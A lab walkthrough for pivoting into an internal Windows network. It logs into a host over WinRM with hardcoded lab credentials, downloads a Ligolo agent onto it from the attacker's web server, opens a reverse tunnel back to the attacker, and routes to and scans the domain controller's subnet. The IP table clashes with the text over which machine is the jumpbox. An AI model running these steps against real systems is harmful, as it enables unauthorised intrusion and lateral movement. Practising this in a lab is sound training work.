# Pivoting Lab – WinRM + Ligolo Tunnel Setup

## Lab Network Setup

| Machine | IP Address |
|--------|------------|
| Win01 | 192.168.2.251 |
| Win01 (2nd NIC) | 192.168.3.251 |
| Win02 | 192.168.3.252 |
| DC01 | 192.168.3.250 |
| Jumpbox | 192.168.2.233 |

The attacker machine (Kali) is connected to the **192.168.2.0/24 network**.

**Goal:** Pivot through **Win01 (Jumpbox)** to access the **192.168.3.0/24 internal network**.

---

# 1. Initial Access – WinRM Connection

Connect from Kali to **Win01** using WinRM.

```bash
evil-winrm -i 192.168.2.251 -u jdoe -p User1234
```

Successful login gives **PowerShell access to the jumpbox**.

---

# 2. Transfer Ligolo Agent to Jumpbox

We need to upload the **Ligolo agent** to the compromised host.

## Start Python Web Server (Attacker Machine)

```bash
python -m http.server 443
```

This will host files from the current directory.

---

## Download Agent on Jumpbox

Run this inside the **WinRM session**.

```powershell
Invoke-WebRequest http://192.168.2.233:443/agent.exe -OutFile C:\Users\Public\agent.exe
```

File will be saved to:

```
C:\Users\Public\agent.exe
```

---

# 3. Prepare Ligolo Interface on Kali

Create a **TUN interface** for tunneling.

```bash
ip tuntap add user root mode tun ligolo
```

Bring the interface up.

```bash
ip link set ligolo up
```

Verify interface.

```bash
ip link show ligolo
```

---

# 4. Start Ligolo Proxy (Attacker Machine)

Start the proxy listener.

```bash
ligolo-proxy -selfcert -laddr 0.0.0.0:443
```

This waits for the agent connection.

---

# 5. Connect Ligolo Agent from Jumpbox

Run the agent on **Win01**.

```powershell
.\agent.exe -connect 192.168.2.233:443 -ignore-cert
```

The agent will connect to the Kali listener.

---

# 6. Establish Tunnel Session

On the **Ligolo proxy console**:

Check sessions.

```
session
```

Select the session.

```
session 1
```

Start tunneling.

```
start
```

---

# 7. Route Internal Network Through Ligolo

Add route to the **internal network**.

```bash
ip route add 192.168.3.0/24 dev ligolo
```

Verify route.

```bash
ip route | grep ligolo
```

Expected output:

```
192.168.3.0/24 dev ligolo
```

---

# 8. Verify Pivot Access

Test connectivity to internal machines.

Example:

```bash
ping 192.168.3.250
```

or

```bash
nmap -sn 192.168.3.0/24
```

If the tunnel works, you should reach:

| Host | IP |
|------|----|
| DC01 | 192.168.3.250 |
| Win01 | 192.168.3.251 |
| Win02 | 192.168.3.252 |
